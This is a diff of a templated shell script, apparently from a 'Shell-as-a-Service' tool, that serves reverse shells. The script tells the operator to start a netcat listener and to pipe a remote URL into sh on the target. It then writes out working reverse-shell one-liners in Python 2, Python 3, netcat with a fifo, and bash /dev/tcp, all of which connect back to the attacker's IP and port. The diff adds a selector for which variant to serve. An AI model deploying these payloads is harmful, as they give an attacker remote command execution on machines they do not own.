@@ -3,31 +3,43 @@
 # Saas (Shell-as-a-Service) based on https://github.com/cmj0121/ptool/shell
 # This shell-script provide the reversed on the target system.
 #
-# 1- run `nc -lvn {{ .PORT }}` on your machine
+# 1- run `nc -lvn {{ .Port }}` on your machine
 # 2- run `curl https://shell.cmj.tw/reversed | sh` on the target machine
+#
+# extra parameter
+#    - ?format=(python|netcat|bash)
+{{- if .Python }}
 
 if command -v python >/dev/null 2>&1; then
-	case $(python -V 2>&1 | awk '{print $2}') in
-	2.*)
-		python -c 'import os, socket as sk; sk = sk.create_connection(("{{- .IP -}}", {{- .PORT -}})); os.popen("bash -i <&{0} >&{0} 2>&{0}".format(sk.fileno()))'
-		;;
-	3.*)
-		python -c 'import socket as sk,subprocess as proc,os; sk=sk.create_connection(("{{- .IP -}}",{{- .PORT -}})); os.dup2(sk.fileno(),0); os.dup2(sk.fileno(),1); os.dup2(sk.fileno(),2); proc.call(["/bin/sh","-i"]);'
-		;;
-	*)
-		echo ${VER}
-		;;
-	esac
-	exit
+    case $(python -V 2>&1 | awk '{print $2}') in
+    2.*)                                                        
+        python -c 'import os, socket as sk; sk = sk.create_connection(("{{- .IP -}}", {{- .Port -}})); os.popen("bash -i <&{0} >
+&{0} 2>&{0}".format(sk.fileno()))'                      
+        ;;
+    3.*)
+        python -c 'import socket as sk,subprocess as proc,os; sk=sk.create_connection(("{{- .IP -}}",{{- .Port -}})); os.dup2(sk
+.fileno(),0); os.dup2(sk.fileno(),1); os.dup2(sk.fileno(),2); proc.call(["/bin/sh","-i"]);'
+        ;;
+    *)
+        echo ${VER}
+        ;;
+    esac
+    exit
 fi
+{{- end -}}
+
+{{- if .NetCat }}
 
 if command -v nc >/dev/null 2>&1; then
-	cd $(mktemp -d);
-	mkfifo tunnel; cat > tunnel | $(which bash) -i tunnel | nc {{ .IP }}  {{ .PORT }} > tunnel
-	exit
+    cd $(mktemp -d);
+    mkfifo tunnel; cat > tunnel | $(which bash) -i tunnel | nc {{ .IP }}  {{ .Port }} > tunnel
+    exit
 fi
+{{- end -}}
+{{- if .Bash }}
 
 if command -v sh >/dev/null 2>&1; then 
-	/bin/sh -i >& /dev/tcp/{{- .IP -}}/{{- .PORT }} 0>&1
+	/bin/sh -i >& /dev/tcp/{{- .IP -}}/{{- .Port }} 0>&1
 	exit
 fi
+{{- end }}
